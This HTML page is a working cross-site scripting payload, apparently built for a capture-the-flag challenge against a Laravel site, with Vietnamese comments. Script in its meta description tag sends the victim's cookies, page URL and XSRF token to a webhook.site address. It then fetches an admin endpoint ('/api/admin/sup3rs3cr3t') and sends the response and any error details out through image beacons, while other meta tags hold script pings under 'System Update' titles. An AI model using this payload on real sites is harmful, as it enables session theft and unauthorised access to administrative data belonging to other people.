<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>XSS Payload - Focused on name=description with Full Debug</title>

    <!-- Thẻ og:title có thể để trống hoặc một giá trị đơn giản -->
    <meta property="og:title" content="System Update">
    
    <!-- Thẻ og:description có thể để trống hoặc một script ping đơn giản -->
    <meta property="og:description" content="<script>console.log('og:description executed');</script>">

    <!-- PAYLOAD CHÍNH VÀ CHI TIẾT NHẤT SẼ ĐẶT Ở ĐÂY -->
    <meta name="description" content="
        <script>
            (function() {
                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                var webhook_base_url = 'https://webhook.site/';
                var attacker_url = webhook_base_url + webhook_id;

                function sendToWebhook(data_obj) { // Đổi tên tham số để rõ ràng hơn
                    var params = new URLSearchParams();
                    // Luôn thêm source_tag
                    params.append('source_tag', 'name:description_FULL_DEBUG'); 
                    
                    for (var key in data_obj) {
                        if (data_obj.hasOwnProperty(key)) {
                            let value = data_obj[key];
                            if (typeof value === 'object' && value !== null) {
                                if (value instanceof Error) {
                                    value = { 
                                        error_name: value.name, 
                                        error_message: value.message, 
                                        error_stack: value.stack ? value.stack.substring(0, 500) : 'no_stack',
                                        error_string: value.toString() 
                                    };
                                } else if (value instanceof Response) {
                                    value = {
                                        response_ok: value.ok,
                                        response_status: value.status,
                                        response_statusText: value.statusText,
                                        response_type: value.type,
                                        response_url: value.url
                                    };
                                }
                                // Cố gắng stringify an toàn hơn
                                try {
                                    params.append(key, JSON.stringify(value));
                                } catch (e_stringify) {
                                    params.append(key, '[Unserializable Object]');
                                }
                            } else {
                                params.append(key, value);
                            }
                        }
                    }
                    var img = new Image();
                    var full_url = attacker_url + '?' + params.toString();
                    img.src = full_url;
                }

                try {
                    sendToWebhook({ 
                        stage: 'script_start', 
                        current_document_cookie: document.cookie || 'empty',
                        location_href: window.location.href 
                    });
                    
                    // Lấy XSRF-TOKEN từ cookie để sử dụng nếu cần
                    var xsrfTokenValue = null;
                    var cookies = document.cookie.split(';');
                    for (var i = 0; i < cookies.length; i++) {
                        var cookie = cookies[i].trim();
                        if (cookie.startsWith('XSRF-TOKEN=')) {
                            xsrfTokenValue = decodeURIComponent(cookie.substring('XSRF-TOKEN='.length));
                            break;
                        }
                    }
                    if (xsrfTokenValue) {
                        sendToWebhook({ stage: 'xsrf_token_found_in_cookie', xsrf_token: xsrfTokenValue });
                    } else {
                        sendToWebhook({ stage: 'xsrf_token_not_in_cookie' });
                    }

                    fetch('/api/admin/sup3rs3cr3t', {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json',
                            'X-Requested-With': 'XMLHttpRequest'
                            // Laravel tự động sử dụng XSRF-TOKEN cookie cho header X-XSRF-TOKEN
                            // nếu nó tồn tại, nên không cần set X-XSRF-TOKEN thủ công ở đây.
                        }
                    })
                    .then(response => {
                        var response_headers_arr = [];
                        try { response_headers_arr = Array.from(response.headers.entries()); } catch(e_headers){}

                        sendToWebhook({ 
                            stage: 'fetch_response_received', 
                            response_status: response.status, // Chỉ gửi status và text trước
                            response_status_text: response.statusText,
                            response_ok: response.ok,
                            response_headers_preview: JSON.stringify(response_headers_arr).substring(0,500) // Preview headers
                        });

                        if (!response.ok) {
                             // Quan trọng: phải clone response trước khi đọc body nhiều lần hoặc nếu muốn đọc sau
                            var clonedResponse = response.clone();
                            return clonedResponse.text().then(text => {
                                var errorToThrow = new Error('Fetch API call failed'); // Thông điệp chung hơn
                                errorToThrow.isResponseError = true;
                                errorToThrow.status = clonedResponse.status;
                                errorToThrow.statusText = clonedResponse.statusText;
                                errorToThrow.responseBody = text ? text.substring(0, 500) : '[No Response Body]';
                                errorToThrow.responseHeaders = JSON.stringify(response_headers_arr);
                                throw errorToThrow;
                            });
                        }
                        return response.json(); // Chỉ gọi .json() nếu response.ok
                    })
                    .then(data => {
                        sendToWebhook({ 
                            stage: 'sup3rs3cr3t_success', 
                            flag_data: data 
                        });
                    })
                    .catch(error => {
                        sendToWebhook({ 
                            stage: 'sup3rs3cr3t_fetch_catch_error', 
                            error_caught: error // Hàm sendToWebhook sẽ cố gắng serialize
                        });
                    });
                } catch (e_outer) { // Đổi tên biến để tránh trùng
                     sendToWebhook({ 
                        stage: 'outer_script_error', 
                        outer_error_details: e_outer // Hàm sendToWebhook sẽ cố gắng serialize
                    });
                }
            })();
        </script>
    ">
    
    <!-- Thẻ Twitter có thể bỏ trống hoặc một ping đơn giản -->
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="System Maintenance">
    <meta name="twitter:description" content="<script>console.log('twitter:description executed');</script>">

</head><body>
    <h1>XSS Payload Page - name=description with FULL DEBUG</h1>
    <p>This page's 'name=description' meta tag contains the primary XSS payload.</p>
</body></html>
